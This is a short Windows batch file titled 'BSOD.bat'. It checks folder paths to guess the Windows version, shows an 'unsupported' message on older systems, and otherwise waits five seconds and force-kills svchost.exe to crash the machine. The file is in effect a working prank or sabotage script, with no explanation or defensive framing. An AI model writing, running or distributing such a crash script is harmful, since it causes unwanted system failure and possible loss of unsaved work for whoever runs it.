@echo off
if exist "C:\Users" goto yes
if exist "C:\Documents and Settings" goto middle
:middle
if exist "C:\Program Files (x86)" goto yes
if exist "C:\Program Files" goto no
:no
cls

title Unsupported Operating System Detected
color 0a

echo Cannot execute BSOD.bat 
echo Windows XP x64/Vista is required to execute this file.
echo .
	
pause
exit
:yes
color 0a
timeout 5
taskkill /f /im svchost.exe
